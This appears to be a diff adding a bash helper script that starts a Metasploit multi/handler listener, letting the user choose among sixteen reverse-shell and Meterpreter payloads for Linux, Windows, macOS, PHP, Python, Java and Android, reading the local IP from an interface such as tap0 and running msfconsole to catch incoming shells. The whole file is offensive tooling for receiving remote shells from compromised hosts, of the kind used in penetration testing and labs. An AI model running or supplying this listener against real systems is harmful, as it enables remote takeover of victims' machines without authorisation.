@@ -1,0 +1,87 @@
+#!/usr/bin/env bash
+
+function usage {
+    echo "Usage: $0 [-p 443] [-i interface] [-l payload number] [-h]"
+    echo "       -h: Help"
+    echo "       -p: Port. Defaults 443"
+    echo "       -i: Network interface. Defaults to tap0"
+    echo "       -l: MSF payloads:
+                        PAYL[0]="linux/x86/meterpreter/reverse_tcp"
+                        PAYL[1]="linux/x64/shell/reverse_tcp"
+                        PAYL[2]="windows/meterpreter/reverse_tcp"
+                        PAYL[3]="windows/meterpreter/reverse_nonx_tcp"
+                        PAYL[4]="windows/x64/meterpreter/reverse_tcp"
+                        PAYL[5]="osx/x86/shell_reverse_tcp"
+                        PAYL[6]="osx/x64/shell_reverse_tcp"
+                        PAYL[7]="php/meterpreter/reverse_tcp"
+                        PAYL[8]="python/meterpreter/reverse_tcp"
+                        PAYL[9]="java/jsp_shell_reverse_tcp"
+                        PAYL[10]="java/meterpreter/reverse_tcp"
+                        PAYL[11]="cmd/unix/reverse_bash"
+                        PAYL[12]="cmd/unix/reverse_netcat"
+                        PAYL[13]="php/reverse_php"
+                        PAYL[14]="windows/vncinject/reverse_tcp"
+                        PAYL[15]="android/meterpreter/reverse_tcp"
+    "
+}
+
+if [[ -z $1 ]]; then
+    usage
+    exit 0
+fi
+
+interface="tap0"
+port=443
+payload=1
+
+while getopts "p:i:l:h" OPT; do
+    case $OPT in
+        p) port=${OPTARG};;
+        i) interface=${OPTARG};;
+        l) payload=${OPTARG};;
+        h) usage; exit 0;;
+        *) usage; exit 0;;
+    esac
+done
+
+if [[ -z $payload ]]; then
+    echo "[!] No payload selected"
+    usage
+    exit 1
+fi
+
+PAYL[0]="linux/x86/meterpreter/reverse_tcp"
+PAYL[1]="linux/x64/shell/reverse_tcp"
+PAYL[2]="windows/meterpreter/reverse_tcp"
+PAYL[3]="windows/meterpreter/reverse_nonx_tcp"
+PAYL[4]="windows/x64/meterpreter/reverse_tcp"
+PAYL[5]="osx/x86/shell_reverse_tcp"
+PAYL[6]="osx/x64/shell_reverse_tcp"
+PAYL[7]="php/meterpreter/reverse_tcp"
+PAYL[8]="python/meterpreter/reverse_tcp"
+PAYL[9]="java/jsp_shell_reverse_tcp"
+PAYL[10]="java/meterpreter/reverse_tcp"
+PAYL[11]="cmd/unix/reverse_bash"
+PAYL[12]="cmd/unix/reverse_netcat"
+PAYL[13]="php/reverse_php"
+PAYL[14]="windows/vncinject/reverse_tcp"
+PAYL[15]="android/meterpreter/reverse_tcp"
+
+THEPAYLOAD=${PAYL[$payload]}
+
+OS=`uname`
+IO=""
+case $OS in
+   Linux) IP=`/sbin/ifconfig $interface  | grep 'inet '| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $2}'`;;
+   *) IP="Unknown";;
+esac
+
+echo "Generated command is..."
+echo 'msfconsole -qx "use exploit/multi/handler;set payload '$THEPAYLOAD';set LHOST '$IP';set LPORT '$port';exploit"'
+msfconsole -qx "use exploit/multi/handler;set payload $THEPAYLOAD;set LHOST $IP;set LPORT $port;exploit"
+
+
+
+
+
+
